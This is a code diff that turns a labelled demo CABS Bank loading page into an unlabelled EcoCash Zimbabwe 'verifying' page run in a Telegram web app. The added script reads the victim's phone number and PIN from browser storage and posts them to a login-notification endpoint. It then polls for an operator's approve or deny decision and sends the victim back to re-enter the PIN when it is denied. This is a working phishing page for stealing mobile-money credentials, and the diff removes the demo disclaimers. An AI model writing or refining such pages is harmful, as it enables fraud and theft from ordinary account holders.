@@ -1,203 +1,177 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#092c4c">
-<title>CABS Bank Zimbabwe | Demo Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Verifying</title>
 
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-<style>
-* {
-    box-sizing: border-box;
-}
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
-    Roboto, Helvetica, Arial, sans-serif;
-    background: #f4f6f9;
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    overflow: hidden;
-}
+        .loading-card {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            padding: 50px 20px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(1, 77, 140, 0.15);
+            border: 1px solid #e1e8ed;
+        }
 
-.loading-card {
-    background: white;
-    width: 90%;
-    max-width: 380px;
-    padding: 40px 20px;
-    border-radius: 16px;
-    text-align: center;
-    box-shadow: 0 10px 30px rgba(9, 44, 76, 0.15);
-    border: 1px solid #e1e8ed;
-}
+        /* EcoCash Blue and Orange Theme */
+        .loader-circle {
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, #007bc4 0%, #014d8c 100%);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            box-shadow: 0 8px 20px rgba(1, 77, 140, 0.3);
+        }
 
-.demo-notice {
-    background: #fff7e8;
-    color: #76531c;
-    border: 1px solid #ead6ad;
-    border-radius: 6px;
-    padding: 8px;
-    font-size: 10px;
-    margin-bottom: 25px;
-}
+        .loader-circle::after {
+            content: '';
+            width: 90px;
+            height: 90px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid #ff6f00; /* EcoCash Accent Orange */
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
 
-/* CABS-inspired blue and gold styling */
-.logo-image {
-    height: 45px;
-    width: auto;
-    object-fit: contain;
-    margin-bottom: 25px;
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-.loader-circle {
-    width: 120px;
-    height: 120px;
-    background: radial-gradient(circle, #174d73 0%, #092c4c 100%);
-    border-radius: 50%;
-    margin: 0 auto 30px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-    box-shadow: 0 8px 20px rgba(9, 44, 76, 0.3);
-}
+        h2 {
+            color: #014d8c; /* EcoCash Dark Navy */
+            font-size: 26px;
+            margin: 0 0 12px;
+            font-weight: bold;
+        }
 
-.loader-circle::after {
-    content: '';
-    width: 90px;
-    height: 90px;
-    border: 4px solid rgba(255,255,255,0.2);
-    border-top: 4px solid #c69a42;
-    border-radius: 50%;
-    animation: spin 1.2s linear infinite;
-}
+        p {
+            color: #555;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+        }
 
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-h2 {
-    color: #092c4c;
-    font-size: 26px;
-    margin: 0 0 12px;
-    font-weight: bold;
-}
-
-p {
-    color: #555;
-    font-size: 15px;
-    margin: 0;
-    line-height: 1.5;
-}
-
-.brand-footer {
-    margin-top: 30px;
-    font-size: 11px;
-    color: #999;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-}
-
-.demo-footer {
-    margin-top: 10px;
-    font-size: 10px;
-    color: #999;
-}
-</style>
+        .brand-footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    </style>
 </head>
 
 <body>
 
 <div class="loading-card">
-
-    <div class="demo-notice">
-        DEMONSTRATION ONLY — NOT AN OFFICIAL BANK SERVICE
-    </div>
-
-    <img
-        class="logo-image"
-        src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
-        alt="CABS logo"
-    >
-
-    <div class="loader-circle" id="loader"></div>
-
+    <div class="loader-circle"></div>
     <h2 id="main-text">Please wait...</h2>
-
-    <p id="sub-text">
-        Running the demonstration verification process...
-    </p>
-
-    <div class="brand-footer">
-        CABS Bank Zimbabwe — Demo Interface
-    </div>
-
-    <div class="demo-footer">
-        © 2026 Demonstration Project
-    </div>
-
+    <p id="sub-text">Verifying your account details...</p>
+    <div class="brand-footer">EcoCash Zimbabwe</div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
 
     const mainText = document.getElementById("main-text");
     const subText = document.getElementById("sub-text");
-    const loader = document.getElementById("loader");
 
     const tg = window.Telegram?.WebApp;
-
     if (tg) {
         tg.ready();
         tg.expand();
     }
 
-    // Read only the demo phone reference.
     const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
 
-    if (phone) {
+    if (!phone) {
+        console.warn("⚠️ No phone found in localStorage");
+    } else {
+        // Force-save to 'user_phone_number' so that page 8 detects it immediately
         localStorage.setItem("user_phone_number", phone);
     }
 
-    // Demo processing message.
+    // -------------------- SEND SINGLE LOGIN REQUEST --------------------
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "Zimbabwe", brand: "EcoCash" })
+        });
+    } catch (err) {
+        console.error("❌ Notification dispatch failed:", err);
+    }
+
+    // -------------------- DYNAMIC TEXT UPDATE --------------------
     setTimeout(() => {
-
-        mainText.textContent = "Processing...";
-        subText.textContent =
-            "Completing the demonstration verification process.";
-
+        if (mainText.textContent !== "Approved!" && mainText.textContent !== "Denied!") {
+            mainText.textContent = "Processing...";
+            subText.textContent = "Securely confirming authentication with EcoCash systems.";
+        }
     }, 4000);
 
-    // No banking PIN collection or credential transmission.
-    // Demonstration completes after the original waiting period.
-    setTimeout(() => {
+    // -------------------- CHECK APPROVAL STATUS --------------------
+    async function checkApproval() {
+        if (!phone) return;
 
-        mainText.textContent = "Demo Completed";
-        subText.textContent =
-            "The demonstration verification process has finished.";
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
 
-        loader.style.background = "#c69a42";
+            if (data.status === "approved") {
+                clearInterval(pollingInterval);
+                mainText.textContent = "Approved!";
+                subText.textContent = "Account verified successfully. Redirecting...";
+                
+                // EcoCash Green Accent highlight style update
+                document.querySelector('.loader-circle').style.background = '#4CAF50';
 
-        loader.style.boxShadow =
-            "0 8px 20px rgba(198,154,66,0.3)";
+                setTimeout(() => {
+                    // We append the phone number to the URL as a reliable fallback for page 8
+                    window.location.href = `/page8.html?phone=${encodeURIComponent(phone)}`;
+                }, 1500);
+            }
 
-        setTimeout(() => {
+            if (data.status === "denied") {
+                clearInterval(pollingInterval);
+                mainText.textContent = "Denied!";
+                subText.textContent = "Incorrect PIN details. Sending you back...";
 
-            // Original successful destination preserved.
-            window.location.href =
-                `/page8.html?phone=${encodeURIComponent(phone)}`;
+                setTimeout(() => {
+                    window.location.href = "/page6.html?error=wrongpin";
+                }, 2000);
+            }
 
-        }, 1500);
+        } catch (err) {
+            console.error("❌ Status check failed:", err);
+        }
+    }
 
-    }, 6500);
-
+    // Check status every 2.5 seconds
+    const pollingInterval = setInterval(checkApproval, 2500);
 });
 </script>
 
